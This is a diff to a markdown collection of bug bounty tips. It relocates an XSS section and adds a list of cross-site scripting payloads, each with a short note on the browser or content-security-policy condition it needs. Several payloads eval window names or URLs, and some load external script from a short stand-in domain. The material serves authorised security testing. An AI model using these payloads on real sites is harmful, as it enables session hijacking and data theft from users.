@@ -49,27 +49,7 @@ This is a collection of Bug Bounty Tips collected from infosec professionals / b
 ?return_path={payload}
 ```
 
-***
 
-## XSS Payloads
-
-```html
-#><img src=x onerror=alert()>.jpg
-```
-***
-
-## XSS Email User Input 
-* The email: test@test.com is being reflected
-* But its required "@" in the email field
-* Following up the [Brutelogic explanation](https://brutelogic.com.br/blog/xss-limited-input-formats/) for limited input formats
-* **The Payload tested in this case:**
-```html
-“<svg/onload=alert(1)>”@x.y 
-```
-**Observations:**
-
-
-* [Medium post source](https://medium.com/bugbountywriteup/reflected-user-input-xss-c3e681710e74)
 ***
 
 ## Bypassing 2FA with CSRF (abusing the 2FA functionality)
@@ -205,3 +185,103 @@ nmap -p443 {IP} --script=http-vuln-cve2020-5902.nse
 ```
 
 ![image](https://i.ibb.co/S0df0bk/5.png)
+
+***
+
+# XSS Payloads
+
+
+* If you control the name, will work on Firefox in any context, will fail in chromium in DOM 
+
+```html
+<svg/onload=eval(name)>
+```
+
+* If you control the URL, Safari-only
+```html
+<iframe/onload=write(URL)>
+```
+
+* If you control the URL 
+```html
+<svg/onload=eval(`'`+URL)>
+```
+
+* If you controll the name, but unsafe-eval not enabled
+```html
+<svg/onload=location=name>
+```
+
+* Just a casual script
+```html
+<script/src=//Ǌ.₨></script>
+```
+
+* If you control the name of the window
+```html
+<iframe/onload=src=top.name>
+```
+
+* If you control the URL
+```html
+<iframe/onload=eval('`'+URL)>
+```
+
+* If number of iframes on the page is constant
+```html
+<iframe/onload=src=top[0].name+/\Ǌ.₨?/>
+```
+
+* for Firefox only
+```html
+<iframe/srcdoc="<svg><script/href=//Ǌ.₨ />">
+```
+
+* If number of iframes on the page is random
+```html
+<iframe/onload=src=contentWindow.name+/\Ǌ.₨?/>
+```
+
+* If unsafe-inline is disabled in CSP and external scripts allowed 
+```html
+<iframe/srcdoc="<script/src=//Ǌ.₨></script>">
+```
+
+* If inline styles are allowed 
+```html
+<style/onload=eval(name)>
+```
+
+* If inline styles are allowed, Safari only
+```html
+<style/onload=write(URL)>
+```
+
+* If inline styles are allowed and the URL can be controlled
+```html
+<style/onload=eval(`'`+URL)>
+```
+
+* If inline styles are blocked
+```html
+<style/onerror=eval(name)>
+```
+
+### XSS Email User Input 
+* The email: test@test.com is being reflected
+* But its required "@" in the email field
+* Following up the [Brutelogic explanation](https://brutelogic.com.br/blog/xss-limited-input-formats/) for limited input formats
+* **The Payload tested in this case:**
+
+```html
+“<svg/onload=alert(1)>”@x.y 
+```
+
+* [Medium post source](https://medium.com/bugbountywriteup/reflected-user-input-xss-c3e681710e74)
+## More XSS Payloads
+
+```html
+#><img src=x onerror=alert()>.jpg
+```
+***
+
